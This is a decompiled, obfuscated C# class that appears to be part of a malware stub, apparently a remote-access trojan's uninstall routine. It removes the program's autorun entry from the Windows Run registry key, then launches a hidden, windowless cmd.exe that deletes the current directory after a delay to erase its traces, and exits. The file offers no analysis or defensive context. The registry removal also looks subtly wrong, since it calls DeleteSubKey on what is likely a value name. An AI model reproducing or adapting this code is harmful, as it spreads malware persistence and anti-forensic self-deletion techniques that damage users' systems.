using System;
using System.Diagnostics;
using Microsoft.Win32;

internal sealed class Class14
{
	public static void smethod_0()
	{
		try
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.Arguments = "/C choice /C Y /N /D Y /T 3 & Del " + Environment.CurrentDirectory;
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.CreateNoWindow = true;
			processStartInfo.FileName = "cmd.exe";
			Process.Start(processStartInfo);
			Environment.Exit(1);
		}
		catch
		{
			Environment.Exit(1);
		}
	}

	public static void smethod_1()
	{
		try
		{
			if (Class2.smethod_0())
			{
				RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
				registryKey.DeleteSubKey(Class15.string_10);
			}
			else
			{
				RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
				registryKey2.DeleteSubKey(Class15.string_10);
			}
			smethod_0();
		}
		catch
		{
		}
	}
}
